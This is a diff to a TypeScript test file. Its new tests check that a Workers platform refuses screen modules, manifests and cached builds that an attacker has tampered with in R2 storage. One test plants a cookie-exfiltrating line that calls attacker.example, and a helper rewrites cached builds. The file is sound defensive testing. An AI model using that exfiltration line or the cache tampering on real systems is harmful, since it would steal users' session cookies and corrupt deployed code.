@@ -1,3 +1,4 @@
+import { toBase64 } from "@grasp-os/shared/encoding";
 import { appIdSchema } from "@grasp-os/shared/ids";
 import { env } from "cloudflare:workers";
 import { eq } from "drizzle-orm";
@@ -5,11 +6,22 @@ import { drizzle } from "drizzle-orm/d1";
 import { describe, expect, it } from "vite-plus/test";
 import { z } from "zod";
 
-import { loadRelease, sealedScreen } from "../src/app-releases.ts";
+import {
+  heldManifest,
+  loadRelease,
+  sealedScreen,
+  versionManifest,
+} from "../src/app-releases.ts";
+import { versionFiles } from "../src/apps.ts";
 import { appCandidateReports, appCandidates } from "../src/db/core/schema.ts";
+import {
+  frameAccess,
+  frameObjectMaxBytes,
+  stageFrame,
+} from "../src/screen-frame.ts";
 import { release } from "./apps.ts";
 import { mockIdp } from "./idp.ts";
-import { loadFrame } from "./screen-frames.ts";
+import { frameDocument, loadFrame, pathOf, routed } from "./screen-frames.ts";
 import { artifactKey, failure } from "./sealed-apps.ts";
 import { signedInApi } from "./sign-in.ts";
 
@@ -70,12 +82,84 @@ const cachedBuilds = async (): Promise<number> => {
   return page.objects.length;
 };
 
+/** Whether `key` is a screen's or the server code's cached build. */
+const isCachedBuild = (key: string): boolean =>
+  /^[a-z-]+-builds\//u.test(key) && !key.startsWith("package-");
+
+/**
+ * Rewrites every entry cached in R2 that `isEntry` picks and holds `word`,
+ * as someone who can write to the bucket but doesn't hold core's secret
+ * could, keeping what it was written with: how many it rewrote.
+ */
+const poisonCache = async (
+  word: string,
+  isEntry: (key: string) => boolean = isCachedBuild
+): Promise<number> => {
+  let poisoned = 0;
+  let cursor: string | undefined;
+  do {
+    // oxlint-disable-next-line no-await-in-loop -- one page after another
+    const page = await env.FILES.list({ cursor, include: ["customMetadata"] });
+    for (const { key, customMetadata } of page.objects) {
+      if (!isEntry(key)) {
+        continue;
+      }
+      // oxlint-disable-next-line no-await-in-loop -- one after another
+      const object = await env.FILES.get(key);
+      // oxlint-disable-next-line no-await-in-loop -- see above
+      const text = (await object?.text()) ?? "";
+      if (text.includes(word)) {
+        // oxlint-disable-next-line no-await-in-loop -- see above
+        await env.FILES.put(
+          key,
+          text.replaceAll(word, "PWNED"),
+          customMetadata === undefined ? {} : { customMetadata }
+        );
+        poisoned += 1;
+      }
+    }
+    cursor = page.truncated ? page.cursor : undefined;
+  } while (cursor !== undefined);
+  return poisoned;
+};
+
 /** An App running `files`, and who builds it. */
 const published = async () => {
   const builder = await signedInApi(idp, "builder");
   const { id } = await builder.api.apps.create({ name: "Sealed screens" });
   await release(builder, id, files);
   return { builder, app: id, id: appIdSchema.parse(id) };
+};
+
+/** Where a build's frame manifest is staged in R2. */
+const manifestKey = (artifact: string): string =>
+  `screen-frames/${artifact}.json`;
+
+/** Where a module an import map names is staged in R2. */
+const moduleKeyOf = (address: string): string =>
+  `screen-modules/${new URL(address).pathname.split("/").at(-1) ?? ""}`;
+
+/** The sha384 Subresource Integrity of `served`, as a browser checks it. */
+const sha384 = async (served: string | Uint8Array): Promise<string> =>
+  `sha384-${toBase64(
+    new Uint8Array(
+      await crypto.subtle.digest(
+        "SHA-384",
+        typeof served === "string" ? new TextEncoder().encode(served) : served
+      )
+    )
+  )}`;
+
+/** `text` as the UTF-8 bytes it encodes to. */
+const encoded = (text: string): number[] => [...new TextEncoder().encode(text)];
+
+/** What core answers for `path`: its status, and how long it may be kept. */
+const served = async (path: string) => {
+  const response = await routed(path);
+  return {
+    status: response.status,
+    cache: response.headers.get("cache-control"),
+  };
 };
 
 describe("screens sealed with their release", { timeout: 120_000 }, () => {
@@ -200,6 +284,273 @@ describe("screens sealed with their release", { timeout: 120_000 }, () => {
       changed: "version.artifact_corrupt",
       unsealed: "screen.not_sealed",
     });
+  });
+
+  it("names the sha384 of every module its frame loads, of the very bytes served", async () => {
+    const { builder, app } = await published();
+    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
+    if (frame === null) {
+      throw new Error("An opened screen has a frame");
+    }
+
+    const expected = Object.fromEntries(
+      await Promise.all(
+        Object.entries(frame.addresses).map(
+          async ([name, address]) =>
+            [address, await sha384(frame.modules[name] ?? "")] as const
+        )
+      )
+    );
+    expect(frame.integrity).toStrictEqual(expected);
+  });
+
+  it("refuses a staged module changed in R2, and stages it again from the sealed bytes at the next open", async () => {
+    const { builder, app } = await published();
+    const bundle = await builder.api.screens.open(app, "desk");
+    const frame = await loadFrame(bundle);
+    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
+      ([named]) => named.startsWith("app~")
+    ) ?? ["", ""];
+    const original = frame?.modules[name];
+
+    // Whoever can write the bucket swaps the module's code, and keeps
+    // what else core stored beside it.
+    const key = moduleKeyOf(address);
+    const staged = await env.FILES.head(key);
+    await env.FILES.put(
+      key,
+      'fetch("https://attacker.example/" + document.cookie);',
+      {
+        customMetadata: staged?.customMetadata ?? {},
+      }
+    );
+    const tampered = await served(pathOf(address));
+    // The frame now misses a module: its document runs nothing.
+    const document = await frameDocument(bundle);
+
+    const reopened = await loadFrame(
+      await builder.api.screens.open(app, "desk")
+    );
+
+    expect({
+      tampered: { status: tampered.status, cache: tampered.cache },
+      document: document.status,
+      healed: reopened?.modules[name],
+    }).toStrictEqual({
+      tampered: { status: 404, cache: "no-store" },
+      document: 404,
+      healed: original,
+    });
+  });
+
+  it("refuses a staged module whose code and name were both changed, however it is named", async () => {
+    const { builder, app } = await published();
+    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
+    const [, address] = Object.entries(frame?.addresses ?? {}).find(([named]) =>
+      named.startsWith("app~")
+    ) ?? ["", ""];
+
+    await env.FILES.put(moduleKeyOf(address), "export default 1;", {
+      customMetadata: { name: "app~elsewhere" },
+    });
+
+    const { status } = await served(pathOf(address));
+    expect(status).toBe(404);
+  });
+
+  it("refuses a staged module or manifest larger than core stages, unread, and stages no build that large", async () => {
+    const { builder, app } = await published();
+    const bundle = await builder.api.screens.open(app, "desk");
+    const frame = await loadFrame(bundle);
+    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
+      ([named]) => named.startsWith("app~")
+    ) ?? ["", ""];
+    const huge = new Uint8Array(frameObjectMaxBytes + 1);
+
+    const key = moduleKeyOf(address);
+    await env.FILES.put(key, huge, { customMetadata: { name } });
+    const module = await served(pathOf(address));
+    const moduleKept = await env.FILES.head(key);
+
+    await builder.api.screens.open(app, "desk");
+    const manifest = await env.FILES.head(manifestKey(bundle.artifact));
+    await env.FILES.put(manifestKey(bundle.artifact), huge, {
+      customMetadata: manifest?.customMetadata ?? {},
+    });
+    const document = await frameDocument(bundle);
+    const manifestKept = await env.FILES.head(manifestKey(bundle.artifact));
+
+    const staging = await failure(async () => {
+      await stageFrame(env, "c".repeat(64), {
+        entry: "app~huge",
+        runtime: "app~huge",
+        modules: { "app~huge": "x".repeat(frameObjectMaxBytes + 1) },
+        kit: {},
+        css: "",
+      });
+    });
+
+    expect({
+      module: module.status,
+      moduleKept: moduleKept !== null,
+      document: document.status,
+      manifestKept: manifestKept !== null,
+      staging,
+    }).toStrictEqual({
+      module: 404,
+      moduleKept: false,
+      document: 404,
+      manifestKept: false,
+      staging: "screen.build_failed",
+    });
+  });
+
+  it("serves a module that starts with a byte order mark, or holds a lone surrogate, as the bytes its integrity names", async () => {
+    const bom = "\uFEFFexport default 1;\n";
+    const surrogate = 'export default "\uD800";\n';
+    const code = {
+      entry: "app~bom",
+      runtime: "app~bom",
+      modules: { "app~bom": bom, "app~surrogate": surrogate },
+      kit: {},
+      css: "",
+    };
+    const artifact = "b".repeat(64);
+    await stageFrame(env, artifact, code);
+    const frame = await loadFrame({
+      artifact,
+      frameToken: await frameAccess(env, artifact),
+    });
+    const modules = await Promise.all(
+      Object.entries(frame?.addresses ?? {}).map(async ([name, address]) => {
+        const response = await routed(pathOf(address));
+        const bytes = new Uint8Array(await response.arrayBuffer());
+        return {
+          name,
+          status: response.status,
+          bytes: [...bytes],
+          integrity: frame?.integrity[address] === (await sha384(bytes)),
+        };
+      })
+    );
+
+    expect(
+      modules.toSorted((a, b) => a.name.localeCompare(b.name))
+    ).toStrictEqual([
+      { name: "app~bom", status: 200, bytes: encoded(bom), integrity: true },
+      {
+        name: "app~surrogate",
+        status: 200,
+        bytes: encoded(surrogate),
+        integrity: true,
+      },
+    ]);
+  });
+
+  it("refuses a frame manifest changed in R2, or moved from another build, and stages it again at the next open", async () => {
+    const { builder, app } = await published();
+    const desk = await builder.api.screens.open(app, "desk");
+    const inbox = await builder.api.screens.open(app, "inbox");
+    const deskFrame = await loadFrame(desk);
+
+    // Inbox's manifest, MAC and all, under desk's build.
+    const inboxManifest = await env.FILES.get(manifestKey(inbox.artifact));
+    await env.FILES.put(
+      manifestKey(desk.artifact),
+      (await inboxManifest?.text()) ?? "",
+      { customMetadata: inboxManifest?.customMetadata ?? {} }
+    );
+    const moved = await frameDocument(desk);
+
+    // Desk's own manifest, its entry pointed elsewhere, its MAC kept.
+    await builder.api.screens.open(app, "desk");
+    const deskManifest = await env.FILES.get(manifestKey(desk.artifact));
+    const text = (await deskManifest?.text()) ?? "{}";
+    await env.FILES.put(
+      manifestKey(desk.artifact),
+      JSON.stringify({ ...JSON.parse(text), entry: "app~elsewhere" }),
+      { customMetadata: deskManifest?.customMetadata ?? {} }
+    );
+    const edited = await frameDocument(desk);
+
+    const reopened = await loadFrame(
+      await builder.api.screens.open(app, "desk")
+    );
+
+    expect({
+      moved: {
+        status: moved.status,
+        cache: moved.headers.get("cache-control"),
+      },
+      edited: {
+        status: edited.status,
+        cache: edited.headers.get("cache-control"),
+      },
+      reopened: reopened?.screen.entry,
+    }).toStrictEqual({
+      moved: { status: 404, cache: "no-store" },
+      edited: { status: 404, cache: "no-store" },
+      reopened: deskFrame?.screen.entry,
+    });
+  });
+
+  it("seals and serves what its files build to, not a build rewritten in R2's cache", async () => {
+    const { builder, app, id } = await published();
+    // The next version builds to what the first did, so sealing it asks
+    // the cache for the builds the first left there.
+    const { version } = await builder.api.apps.files.commit(
+      app,
+      { "screens/desk.tsx": `${files["screens/desk.tsx"]}\n` },
+      "Again"
+    );
+    const poisoned = {
+      screens: await poisonCache("Desk"),
+      server: await poisonCache("Sealed screens"),
+    };
+    await builder.api.apps.versions.setCurrent(app, version);
+
+    const sealed = await sealedScreen(env, id, version, "desk");
+    const frame = await loadFrame(await builder.api.screens.open(app, "desk"));
+    const running = await loadRelease(env, id, version);
+
+    expect({
+      rewrote: poisoned.screens > 0 && poisoned.server > 0,
+      sealed: JSON.stringify(sealed.code).includes("PWNED"),
+      served: JSON.stringify(frame?.modules ?? {}).includes("PWNED"),
+      server: JSON.stringify([running.modules, running.app]).includes("PWNED"),
+    }).toStrictEqual({
+      rewrote: true,
+      sealed: false,
+      served: false,
+      server: false,
+    });
+  });
+
+  it("reads an unsealed version's manifest from its code, not an inspection rewritten in R2's cache", async () => {
+    const { builder, app, id } = await published();
+    // Not made current, so not sealed: its manifest is its code's
+    // inspection, kept in R2 for the same code.
+    const { version } = await builder.api.apps.files.commit(
+      app,
+      { "screens/desk.tsx": `${files["screens/desk.tsx"]}\n` },
+      "Again"
+    );
+    const saved = await versionFiles(env, id, version);
+    await versionManifest(env, id, version, saved);
+    const rewrote = await poisonCache("Sealed screens", (key) =>
+      key.startsWith("inspections/")
+    );
+
+    // What core only holds is asked first, before an inspection again
+    // writes its own over the rewritten one.
+    const held = await heldManifest(env, id, version, saved);
+    const manifest = await versionManifest(env, id, version, saved);
+
+    expect({
+      rewrote: rewrote > 0,
+      read: JSON.stringify(manifest).includes("PWNED"),
+      held: JSON.stringify(held ?? {}).includes("PWNED"),
+    }).toStrictEqual({ rewrote: true, read: false, held: false });
   });
 
   it("refuses to make a version current whose screen doesn't build", async () => {
